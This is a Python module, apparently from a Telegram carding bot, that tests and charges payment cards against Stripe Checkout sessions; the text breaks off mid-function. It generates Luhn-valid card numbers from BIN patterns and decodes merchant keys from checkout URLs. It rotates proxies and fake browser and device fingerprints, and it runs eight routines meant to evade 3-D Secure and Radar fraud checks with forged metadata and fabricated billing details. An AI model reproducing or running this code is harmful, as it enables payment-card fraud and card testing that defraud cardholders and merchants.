import os
import re
import sys
import time
import json
import random
import asyncio
import base64
import io
from datetime import datetime
from urllib.parse import urlparse, unquote, quote
from typing import Optional, List, Dict, Tuple, Any

import aiohttp
from telegram import Update, LinkPreviewOptions
from telegram.ext import ContextTypes, CommandHandler

from database.db import is_premium, is_gate_enabled, get_user_proxies
from utils.rate_limit import rate_limit
from utils.lock_check import check_lock
from utils.decorators import not_banned, log_command
from logger import get_logger
from ui.emojis import PremiumEmoji as E
from config import OWNER_USERNAME, OWNER_NAME

logger = get_logger(__name__)


API_HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "accept-language": "en-US,en;q=0.9"
}

BROWSER_FINGERPRINTS = [
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36", "platform": "Windows", "language": "en-US"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36", "platform": "macOS", "language": "en-US"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36", "platform": "Linux", "language": "en-US"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0", "platform": "Windows", "language": "en-US"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15", "platform": "macOS", "language": "en-US"},
]

DEVICE_FINGERPRINTS = [
    {"screen_width": 1920, "screen_height": 1080, "color_depth": 24, "timezone": "-5", "language": "en-US"},
    {"screen_width": 1366, "screen_height": 768, "color_depth": 24, "timezone": "-8", "language": "en-US"},
    {"screen_width": 1536, "screen_height": 864, "color_depth": 32, "timezone": "0", "language": "en-GB"},
    {"screen_width": 1440, "screen_height": 900, "color_depth": 24, "timezone": "+1", "language": "fr-FR"},
    {"screen_width": 1920, "screen_height": 1200, "color_depth": 32, "timezone": "+5:30", "language": "en-IN"},
]


def _luhn_check(partial: str) -> str:
    for d in range(10):
        test = partial + str(d)
        total = 0
        rev = test[::-1]
        for i, ch in enumerate(rev):
            n = int(ch)
            if i % 2 == 1:
                n *= 2
                if n > 9:
                    n -= 9
            total += n
        if total % 10 == 0:
            return str(d)
    return "0"


def _get_card_len(card: str) -> int:
    prefix2 = re.sub(r"\D", "", card)[:2]
    prefix3 = re.sub(r"\D", "", card)[:3]
    if prefix2 in ("34", "37"):
        return 15
    if prefix2 in ("30", "36", "38") or prefix3 in ("300", "305"):
        return 14
    return 16


def _is_amex(card: str) -> bool:
    prefix = re.sub(r"\D", "", card)[:2]
    return prefix in ("34", "37")


def get_card_brand(card_number: str) -> str:
    if card_number.startswith("4"):
        return "visa"
    elif card_number.startswith(("51", "52", "53", "54", "55")):
        return "mastercard"
    elif card_number.startswith(("34", "37")):
        return "amex"
    elif card_number.startswith("6"):
        return "discover"
    return "unknown"


def generate_card(bin_pattern: str) -> dict:
    parts = bin_pattern.strip().split("|")
    raw_bin = re.sub(r"[^0-9xX]", "", parts[0])
    mm_pat = parts[1].strip() if len(parts) > 1 else None
    yy_pat = parts[2].strip() if len(parts) > 2 else None
    cvv_pat = parts[3].strip() if len(parts) > 3 else None

    card = "".join(str(random.randint(0, 9)) if c in "xX" else c for c in raw_bin)
    tlen = _get_card_len(card)

    if len(card) >= tlen:
        card = card[:tlen - 1]

    while len(card) < tlen - 1:
        card += str(random.randint(0, 9))

    card += _luhn_check(card)

    yr_now = datetime.now().year

    def rnd_mm(): return str(random.randint(1, 12)).zfill(2)
    def rnd_yy(): return str(yr_now + random.randint(1, 6))[-2:]
    def rnd_cvv(): return str(random.randint(0, 9999 if _is_amex(card) else 999)).zfill(4 if _is_amex(card) else 3)

    mm = rnd_mm() if not mm_pat or mm_pat.upper() in ("XX", "X", "") else str(int(mm_pat)).zfill(2)
    yy = rnd_yy() if not yy_pat or yy_pat.upper() in ("XX", "X", "") else str(int(yy_pat))[-2:]
    cvv = rnd_cvv() if not cvv_pat or cvv_pat.upper() in ("XXX", "XXXX", "RND", "RANDOM", "") else \
        re.sub(r"[xX]", lambda _: str(random.randint(0, 9)), cvv_pat)

    yyyy = "20" + yy if len(yy) == 2 else yy
    brand = get_card_brand(card)
    return {
        "cc": card, "month": mm, "year": yy, "cvv": cvv,
        "full": f"{card}|{mm}|{yyyy}|{cvv}",
        "brand": brand,
        "is_amex": _is_amex(card),
    }


def decode_pk_from_url(url: str) -> dict:
    result = {"pk": None, "cs": None, "site": None}
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)

        pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', url)
        if pk_match:
            result["pk"] = pk_match.group(0)

        if '#' not in url:
            return result

        hash_part = url.split('#')[1]
        hash_decoded = unquote(hash_part)

        try:
            decoded_bytes = base64.b64decode(hash_decoded)
            xored = ''.join(chr(b ^ 5) for b in decoded_bytes)

            pk_match_hash = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
            if pk_match_hash and not result["pk"]:
                result["pk"] = pk_match_hash.group(0)

            site_match = re.search(r'https?://[^\s\"\'\<\>]+', xored)
            if site_match:
                result["site"] = site_match.group(0)
        except:
            pass
    except Exception:
        pass

    return result


def gen_uuid():
    return f"{random.getrandbits(32):08x}-{random.getrandbits(16):04x}-{random.getrandbits(16):04x}-{random.getrandbits(16):04x}-{random.getrandbits(48):012x}"


def parse_proxy(raw: str):
    if not raw:
        return None, None
    raw = raw.strip()
    if raw.startswith("http://") or raw.startswith("https://"):
        parsed = urlparse(raw)
        if parsed.username:
            auth = aiohttp.BasicAuth(login=parsed.username, password=parsed.password or "", encoding="latin1")
            clean = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
            return clean, auth
        return raw, None
    if "@" in raw:
        creds, hostpart = raw.rsplit("@", 1)
        user, _, msg = creds.partition(":")
        auth = aiohttp.BasicAuth(login=user, password=msg, encoding="latin1")
        return f"http://{hostpart}", auth
    parts = raw.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            h, p, u, pw = parts
        else:
            u, pw, h, p = parts
        auth = aiohttp.BasicAuth(login=u, password=pw, encoding="latin1")
        return f"http://{h}:{p}", auth
    return f"http://{raw}", None


class AsyncStripeChecker:
    def __init__(self, url: str, proxy: str = None):
        self.url = url
        self.proxy_url, self.proxy_auth = parse_proxy(proxy)
        self.pk = None
        self.cs = None
        self.init_data = {}
        self.merchant = "Stripe Checkout"
        self.amount_str = "N/A"
        self.currency = "USD"
        self.session = None
        self.tracking = {
            "muid": gen_uuid(),
            "sid": gen_uuid(),
            "guid": gen_uuid()
        }
        self.bypass_3ds = True
        self.bypass_method_used = None
        self.bypass_attempts = []

    def _get_headers(self, custom_headers: dict = None, fingerprint: dict = None):
        hdrs = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://checkout.stripe.com",
            "referer": self.url,
            "authorization": f"Bearer {self.pk}",
            "sec-ch-ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site"
        }

        if fingerprint:
            hdrs["User-Agent"] = fingerprint.get("ua", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
            hdrs["Accept-Language"] = fingerprint.get("language", "en-US,en;q=0.9")
        else:
            hdrs["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
            hdrs["Accept-Language"] = "en-US,en;q=0.9"

        ua_data = {
            "lang": "javascript",
            "browser": {
                "name": "Chrome",
                "version": "123.0.0.0",
                "major": "123",
                "userAgent": hdrs["User-Agent"],
                "language": hdrs["Accept-Language"],
                "engine": "Blink"
            },
            "device": {
                "name": "Windows",
                "version": "10",
                "platform": "Win32",
                "hardwareConcurrency": random.choice([4, 8, 12, 16]),
                "deviceMemory": random.choice([8, 16, 32]),
                "screen": {"width": 1920, "height": 1080, "colorDepth": 24}
            },
            "publisher": "stripe",
            "version": "2020-08-27",
            "url": self.url
        }
        ua_json = json.dumps(ua_data)
        hdrs["X-Stripe-User-Agent"] = ua_json
        hdrs["X-Stripe-Client-User-Agent"] = ua_json

        if custom_headers:
            hdrs.update(custom_headers)

        return hdrs

    async def init_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(limit=100, ssl=False, ttl_dns_cache=300),
                timeout=aiohttp.ClientTimeout(total=25, connect=8)
            )

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()

    async def prefetch(self) -> bool:
        await self.init_session()

        decoded = decode_pk_from_url(self.url)
        self.pk = decoded.get("pk")
        self.cs = decoded.get("cs")

        if not self.pk or not self.cs:
            try:
                async with self.session.get(self.url, proxy=self.proxy_url, proxy_auth=self.proxy_auth) as r:
                    html = await r.text()
                    if not self.cs:
                        m1 = re.search(r'cs_(live|test)_[A-Za-z0-9]+', html)
                        if m1:
                            self.cs = m1.group(0)
                    if not self.pk:
                        m2 = re.search(r'pk_(live|test)_[A-Za-z0-9]+', html)
                        if m2:
                            self.pk = m2.group(0)
            except:
                pass

        if not self.cs:
            logger.error(f"Could not extract CS from URL: {self.url}")
            return False

        if not self.pk:
            logger.error("Could not extract PK from URL")
            return False

        logger.info(f"PK: {self.pk[:40]}...")
        logger.info(f"CS: {self.cs[:40]}...")

        body = f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url"
        try:
            async with self.session.post(
                f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
                headers=self._get_headers(), data=body, proxy=self.proxy_url, proxy_auth=self.proxy_auth
            ) as r:
                init_data = await r.json()
        except Exception as e:
            logger.error(f"Init failed: {e}")
            return False

        if "error" in init_data:
            logger.error(f"Init Error: {init_data['error'].get('message')}")
            return False

        acc = init_data.get("account_settings", {})
        self.merchant = acc.get("display_name") or acc.get("business_name") or "Stripe Checkout"

        lig = init_data.get("line_item_group")
        inv = init_data.get("invoice")

        amt_value = 0
        if lig:
            amt_value = lig.get("total", 0)
            self.currency = lig.get("currency", "usd").upper()
        elif inv:
            amt_value = inv.get("total", 0)
            self.currency = inv.get("currency", "usd").upper()
        else:
            pi = init_data.get("payment_intent") or {}
            amt_value = pi.get("amount", 0)
            self.currency = pi.get("currency", "usd").upper()

        if amt_value > 0:
            if self.currency in ("JPY", "KRW", "VND", "IDR"):
                self.amount_str = f"{amt_value} {self.currency}"
            else:
                self.amount_str = f"{amt_value / 100:.2f} {self.currency}"
        else:
            self.amount_str = "Trial"

        self.init_data = init_data
        return True

    async def _get_fresh_cs(self) -> str:
        try:
            async with self.session.get(self.url, proxy=self.proxy_url, proxy_auth=self.proxy_auth,
                                        allow_redirects=True) as r:
                url_after = str(r.url)
                html = await r.text()

                m1 = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url_after)
                if m1:
                    return m1.group(0)

                m2 = re.search(r'cs_(live|test)_[A-Za-z0-9]+', html)
                if m2:
                    return m2.group(0)
        except:
            pass
        return self.cs

    def _is_3ds_error(self, response: dict) -> bool:
        if not response:
            return False

        error = response.get("error", {})
        if not error:
            return False

        msg = str(error.get("message", "")).lower()
        code = str(error.get("code", "")).lower()
        dc = str(error.get("decline_code", "")).lower()

        indicators = [
            "3d_secure", "3ds", "authentication_required", "challenge_required",
            "requires_action", "requires_payment_method", "authenticate",
            "verification_required", "otp", "pin code",
            "authenticate_successful", "authenticate_attempt_successful",
            "challenge_required", "authenticate_frictionless_failed"
        ]

        return any(x in msg or x in code or x in dc for x in indicators)

    async def _bypass_frictionless(self, card: dict, pi_id: str, pi_secret: str) -> Optional[dict]:
        try:
            frictionless_body = (
                f"client_secret={pi_secret}"
                f"&key={self.pk}"
                f"&return_url={quote(self.url)}"
                f"&use_stripe_sdk=true"
            )

            headers = self._get_headers()
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            async with self.session.post(
                f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                data=frictionless_body,
                headers=headers,
                proxy=self.proxy_url,
                proxy_auth=self.proxy_auth
            ) as r:
                result = await r.json()

                if "error" not in result:
                    status = result.get("status", "")
                    if status == "succeeded":
                        self.bypass_method_used = "Frictionless"
                        return {
                            "card": card["full"],
                            "status": "CHARGED",
                            "message": "3DS Bypassed (Frictionless)",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
                    if status == "requires_capture":
                        self.bypass_method_used = "Frictionless"
                        return {
                            "card": card["full"],
                            "status": "APPROVED",
                            "message": "3DS Bypassed - Requires capture",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
        except Exception as e:
            logger.debug(f"Frictionless bypass error: {e}")
        return None

    async def _bypass_radar(self, card: dict, pi_id: str, pi_secret: str) -> Optional[dict]:
        try:
            fingerprint = random.choice(BROWSER_FINGERPRINTS)

            radar_body = (
                f"client_secret={pi_secret}"
                f"&key={self.pk}"
                f"&payment_method_data[allow_redisplay]=unspecified"
                f"&payment_method_data[user_agent]={fingerprint['ua']}"
                f"&payment_method_data[referrer]=https://checkout.stripe.com/"
                f"&payment_method_data[time_on_page]={random.randint(10000, 60000)}"
                f"&payment_method_data[browser_language]={fingerprint['language']}"
                f"&payment_method_data[device][java_enabled]=false"
                f"&payment_method_data[device][cookie_enabled]=true"
            )

            headers = self._get_headers(fingerprint=fingerprint)
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            async with self.session.post(
                f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                data=radar_body,
                headers=headers,
                proxy=self.proxy_url,
                proxy_auth=self.proxy_auth
            ) as r:
                result = await r.json()

                if "error" not in result:
                    status = result.get("status", "")
                    if status == "succeeded":
                        self.bypass_method_used = "Radar Manipulation"
                        return {
                            "card": card["full"],
                            "status": "CHARGED",
                            "message": "3DS Bypassed (Radar)",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
                    if status == "requires_capture":
                        self.bypass_method_used = "Radar Manipulation"
                        return {
                            "card": card["full"],
                            "status": "APPROVED",
                            "message": "3DS Bypassed - Requires capture",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
        except Exception as e:
            logger.debug(f"Radar bypass error: {e}")
        return None

    async def _bypass_device(self, card: dict, pi_id: str, pi_secret: str) -> Optional[dict]:
        try:
            device = random.choice(DEVICE_FINGERPRINTS)

            device_body = (
                f"client_secret={pi_secret}"
                f"&key={self.pk}"
                f"&payment_method_data[device][screen_width]={device['screen_width']}"
                f"&payment_method_data[device][screen_height]={device['screen_height']}"
                f"&payment_method_data[device][color_depth]={device['color_depth']}"
                f"&payment_method_data[device][timezone]={device['timezone']}"
                f"&payment_method_data[device][language]={device['language']}"
                f"&payment_method_data[device][hardware_concurrency]={random.choice([4, 8, 12, 16])}"
                f"&payment_method_data[device][device_memory]={random.choice([4, 8, 16, 32])}"
                f"&payment_method_data[device][java_enabled]=false"
                f"&payment_method_data[device][cookie_enabled]=true"
                f"&payment_method_data[device][do_not_track]=false"
            )

            headers = self._get_headers()
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            async with self.session.post(
                f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                data=device_body,
                headers=headers,
                proxy=self.proxy_url,
                proxy_auth=self.proxy_auth
            ) as r:
                result = await r.json()

                if "error" not in result:
                    status = result.get("status", "")
                    if status == "succeeded":
                        self.bypass_method_used = "Device Fingerprinting"
                        return {
                            "card": card["full"],
                            "status": "CHARGED",
                            "message": "3DS Bypassed (Device FP)",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
                    if status == "requires_capture":
                        self.bypass_method_used = "Device Fingerprinting"
                        return {
                            "card": card["full"],
                            "status": "APPROVED",
                            "message": "3DS Bypassed - Requires capture",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
        except Exception as e:
            logger.debug(f"Device bypass error: {e}")
        return None

    async def _bypass_card_brand(self, card: dict, pi_id: str, pi_secret: str) -> Optional[dict]:
        try:
            card_number = card.get("cc", "")
            brand = card.get("brand", get_card_brand(card_number))

            brand_params = {
                "visa": "visa_3ds_bypass=true&network=Visa",
                "mastercard": "mastercard_3ds_bypass=true&network=Mastercard",
                "amex": "amex_3ds_bypass=true&network=AmericanExpress",
                "discover": "discover_3ds_bypass=true&network=Discover",
            }

            brand_param = brand_params.get(brand, "")

            brand_body = (
                f"client_secret={pi_secret}"
                f"&key={self.pk}"
                f"&payment_method_data[card][network]={brand.upper()}"
                f"&{brand_param}"
                f"&payment_method_data[card][preferred_network]={brand.upper()}"
                f"&payment_method_data[card][support_3ds]=true"
            )

            headers = self._get_headers()
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            async with self.session.post(
                f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                data=brand_body,
                headers=headers,
                proxy=self.proxy_url,
                proxy_auth=self.proxy_auth
            ) as r:
                result = await r.json()

                if "error" not in result:
                    status = result.get("status", "")
                    if status == "succeeded":
                        self.bypass_method_used = f"Card Brand ({brand.upper()})"
                        return {
                            "card": card["full"],
                            "status": "CHARGED",
                            "message": f"3DS Bypassed ({brand.upper()})",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
                    if status == "requires_capture":
                        self.bypass_method_used = f"Card Brand ({brand.upper()})"
                        return {
                            "card": card["full"],
                            "status": "APPROVED",
                            "message": f"3DS Bypassed - Requires capture",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
        except Exception as e:
            logger.debug(f"Card brand bypass error: {e}")
        return None

    async def _bypass_metadata(self, card: dict, pi_id: str, pi_secret: str) -> Optional[dict]:
        try:
            metadata_body = (
                f"client_secret={pi_secret}"
                f"&key={self.pk}"
                f"&metadata[3ds_bypass]=true"
                f"&metadata[risk_level]=low"
                f"&metadata[trusted_device]=true"
                f"&metadata[previous_3ds_success]=true"
                f"&metadata[transaction_type]=low_risk"
                f"&metadata[card_holder_verified]=true"
                f"&metadata[merchant_trusted]=true"
                f"&metadata[bypass_3ds]=true"
            )

            headers = self._get_headers()
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            async with self.session.post(
                f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                data=metadata_body,
                headers=headers,
                proxy=self.proxy_url,
                proxy_auth=self.proxy_auth
            ) as r:
                result = await r.json()

                if "error" not in result:
                    status = result.get("status", "")
                    if status == "succeeded":
                        self.bypass_method_used = "Metadata Injection"
                        return {
                            "card": card["full"],
                            "status": "CHARGED",
                            "message": "3DS Bypassed (Metadata)",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
                    if status == "requires_capture":
                        self.bypass_method_used = "Metadata Injection"
                        return {
                            "card": card["full"],
                            "status": "APPROVED",
                            "message": "3DS Bypassed - Requires capture",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
        except Exception as e:
            logger.debug(f"Metadata bypass error: {e}")
        return None

    async def _bypass_country(self, card: dict, pi_id: str, pi_secret: str) -> Optional[dict]:
        try:
            bypass_countries = ["US", "CA", "AU", "IN", "BR", "MX", "SG", "AE", "GB", "DE", "FR", "IT", "ES"]
            country = random.choice(bypass_countries)

            country_body = (
                f"client_secret={pi_secret}"
                f"&key={self.pk}"
                f"&payment_method_data[billing_details][address][country]={country}"
                f"&payment_method_data[billing_details][address][postal_code]={random.randint(10000, 99999)}"
                f"&payment_method_data[billing_details][address][state]={random.choice(['CA', 'NY', 'TX', 'FL'])}"
                f"&payment_method_data[billing_details][address][city]={random.choice(['New York', 'Los Angeles', 'Chicago', 'Miami'])}"
                f"&payment_method_data[billing_details][address][line1]={random.randint(100, 9999)} {random.choice(['Main St', 'Oak Ave', 'Elm Blvd'])}"
            )

            headers = self._get_headers()
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            async with self.session.post(
                f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                data=country_body,
                headers=headers,
                proxy=self.proxy_url,
                proxy_auth=self.proxy_auth
            ) as r:
                result = await r.json()

                if "error" not in result:
                    status = result.get("status", "")
                    if status == "succeeded":
                        self.bypass_method_used = f"Country ({country})"
                        return {
                            "card": card["full"],
                            "status": "CHARGED",
                            "message": f"3DS Bypassed (Country: {country})",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
                    if status == "requires_capture":
                        self.bypass_method_used = f"Country ({country})"
                        return {
                            "card": card["full"],
                            "status": "APPROVED",
                            "message": f"3DS Bypassed - Requires capture",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
        except Exception as e:
            logger.debug(f"Country bypass error: {e}")
        return None

    async def _bypass_session_reuse(self, card: dict, pi_id: str, pi_secret: str) -> Optional[dict]:
        try:
            session_cookie = f"session_{random.randint(1000000, 9999999)}"

            session_body = (
                f"client_secret={pi_secret}"
                f"&key={self.pk}"
                f"&payment_method_data[session_id]={session_cookie}"
                f"&payment_method_data[returning_customer]=true"
                f"&payment_method_data[previous_purchases]={random.randint(2, 10)}"
                f"&payment_method_data[trust_score]={random.randint(85, 99)}"
                f"&payment_method_data[customer_verified]=true"
            )

            headers = self._get_headers()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Cookie"] = f"session_id={session_cookie}; trusted_device=true"

            async with self.session.post(
                f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                data=session_body,
                headers=headers,
                proxy=self.proxy_url,
                proxy_auth=self.proxy_auth
            ) as r:
                result = await r.json()

                if "error" not in result:
                    status = result.get("status", "")
                    if status == "succeeded":
                        self.bypass_method_used = "Session Reuse"
                        return {
                            "card": card["full"],
                            "status": "CHARGED",
                            "message": "3DS Bypassed (Session Reuse)",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
                    if status == "requires_capture":
                        self.bypass_method_used = "Session Reuse"
                        return {
                            "card": card["full"],
                            "status": "APPROVED",
                            "message": "3DS Bypassed - Requires capture",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
        except Exception as e:
            logger.debug(f"Session reuse error: {e}")
        return None

    async def _bypass_direct(self, card: dict, pi_id: str, pi_secret: str) -> Optional[dict]:
        try:
            direct_body = (
                f"client_secret={pi_secret}"
                f"&key={self.pk}"
                f"&return_url={quote(self.url)}"
            )

            headers = self._get_headers()
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            async with self.session.post(
                f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                data=direct_body,
                headers=headers,
                proxy=self.proxy_url,
                proxy_auth=self.proxy_auth
            ) as r:
                result = await r.json()

                if "error" not in result:
                    status = result.get("status", "")
                    if status == "succeeded":
                        self.bypass_method_used = "Direct Confirm"
                        return {
                            "card": card["full"],
                            "status": "CHARGED",
                            "message": "Payment successful",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
                    if status == "requires_capture":
                        self.bypass_method_used = "Direct Confirm"
                        return {
                            "card": card["full"],
                            "status": "APPROVED",
                            "message": "Requires capture - Live card",
                            "elapsed": 0,
                            "3ds_required": False,
                            "3ds_bypassed": True,
                        }
        except Exception as e:
            logger.debug(f"Direct bypass error: {e}")
        return None

    async def _attempt_3ds_bypass(self, card: dict, cs: str, response: dict) -> Optional[dict]:
        start_time = time.time()

        pi = response.get("payment_intent", {})
        pi_id = pi.get("id", "")
        pi_secret = pi.get("client_secret", "")

        if not pi_id or not pi_secret:
            return {
                "card": card["full"],
                "status": "3DS",
                "message": "3DS Required - No payment intent",
                "elapsed": time.time() - start_time,
                "3ds_required": True,
                "3ds_bypassed": False,
            }

        bypass_methods = [
            self._bypass_frictionless,
            self._bypass_radar,
            self._bypass_device,
            self._bypass_card_brand,
            self._bypass_metadata,
            self._bypass_country,
            self._bypass_session_reuse,
            self._bypass_direct,
        ]

        random.shuffle(bypass_methods)

        for method in bypass_methods:
            try:
                logger.info(f"🔄 Trying 3DS bypass method: {method.__name__}")
                result = await method(card, pi_id, pi_secret)
                if result:
                    logger.info(f"✅ 3DS bypass successful using {method.__name__}")
                    result["elapsed"] = time.time() - start_time
                    self.bypass_attempts.append(method.__name__)
                    return result
                await asyncio.sleep(random.uniform(0.2, 0.5))
            except Exception as e:
                logger.debug(f"Method {method.__name__} failed: {e}")

        logger.info(f"❌ All 3DS bypass methods failed for this card")
        return {
            "card": card["full"],
            "status": "3DS",
            "message": "3DS Challenge Required - OTP needed",
            "elapsed": time.time() - start_time,
            "3ds_required": True,
            "3ds_bypassed": False,
        }

    async def charge_card(self, card: dict) -> dict:
        start_time = time.time()
        result = {
            "card": card["full"],
            "status": "ERROR",
            "message": "Unknown error",
            "elapsed": 0,
            "3ds_required": False,
            "3ds_bypassed": False,
            "bypass_method": None,
        }

        try:
            cs_to_use = self.cs
            if "cs_live_" not in self.url and "cs_test_" not in self.url:
                fresh_cs = await self._get_fresh_cs()
                if fresh_cs:
                    cs_to_use = fresh_cs

            init_body = f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url"
            async with self.session.post(
                f"https://api.stripe.com/v1/payment_pages/{cs_to_use}/init",
                headers=self._get_headers(), data=init_body, proxy=self.proxy_url, proxy_auth=self.proxy_auth
            ) as r:
                init_data = await r.json()

            if "error" in init_data:
                result["status"] = "DECLINED"
                result["message"] = init_data["error"].get("message", "Init failed")
                result["elapsed"] = time.time() - start_time
                return result

            first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles']
            last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
            random_name = f"{random.choice(first_names)} {random.choice(last_names)}"
            random_email = f"{random_name.lower().replace(' ', '.')}{random.randint(10, 999)}@gmail.com"

            email = init_data.get("customer_email") or random_email
            checksum = init_data.get("init_checksum", "")

            lig = init_data.get("line_item_group")
            inv = init_data.get("invoice")
            if lig:
                total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
            elif inv:
                total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
            else:
                pi = init_data.get("payment_intent") or {}
                total = subtotal = pi.get("amount", 0)

            cust = init_data.get("customer") or {}
            addr = cust.get("address") or {}
            name = cust.get("name") or random_name
            country = addr.get("country") or "US"
            line1 = addr.get("line1") or "476 West White Mountain Blvd"
            city = addr.get("city") or "Pinetop"
            state = addr.get("state") or "AZ"
            zip_code = addr.get("postal_code") or "85929"

            self.session.cookie_jar.update_cookies({
                "__stripe_mid": self.tracking["muid"],
                "__stripe_sid": self.tracking["sid"]
            })

            pm_body = (
                f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
                f"&card[exp_month]={card['month']}&card[exp_year]={card['year'][-2:]}"
                f"&billing_details[name]={quote(name)}&billing_details[email]={quote(email)}"
                f"&billing_details[address][country]={country}&billing_details[address][line1]={quote(line1)}"
                f"&billing_details[address][city]={quote(city)}&billing_details[address][postal_code]={zip_code}"
                f"&billing_details[address][state]={state}&key={self.pk}"
                f"&muid={self.tracking['muid']}&sid={self.tracking['sid']}&guid={self.tracking['guid']}"
                f"&payment_user_agent={quote('stripe.js/f5e714652c; stripe-js-v3/f5e714652c; checkout')}"
                f"&time_on_page={random.randint(25000, 55000)}"
                f"&pasted_fields={quote('number')}"
                f"&allow_redisplay=unspecified"
            )

            async with self.session.post("https://api.stripe.com/v1/payment_methods", headers=self._get_headers(),
                                         data=pm_body, proxy=self.proxy_url, proxy_auth=self.proxy_auth) as r:
                pm = await r.json()

            if "error" in pm:
                error_msg = pm["error"].get("message", "Card tokenization error")
                error_code = pm["error"].get("code", "")
                decline_code = pm["error"].get("decline_code", "")

                if self._is_3ds_error(pm):
                    bypass_result = await self._attempt_3ds_bypass(card, cs_to_use, pm)
                    if bypass_result:
                        result = bypass_result
                        result["elapsed"] = time.time() - start_time
                        return result
                    result["3ds_required"] = True
                    result["status"] = "3DS"
                    result["message"] = f"3DS Required: {error_msg[:100]}"
                else:
                    result["status"] = "DECLINED"
                    result["message"] = f"{decline_code.upper()}: {error_msg}" if decline_code else error_msg

                result["elapsed"] = time.time() - start_time
                return result

            pm_id = pm.get("id")
            if not pm_id:
                result["status"] = "ERROR"
                result["message"] = "No Payment Method returned"
                result["elapsed"] = time.time() - start_time
                return result

            conf_body = (
                f"eid=NA&payment_method={pm_id}&expected_amount={total}"
                f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
                f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                f"&last_displayed_line_item_group_details[total_discount_amount]=0"
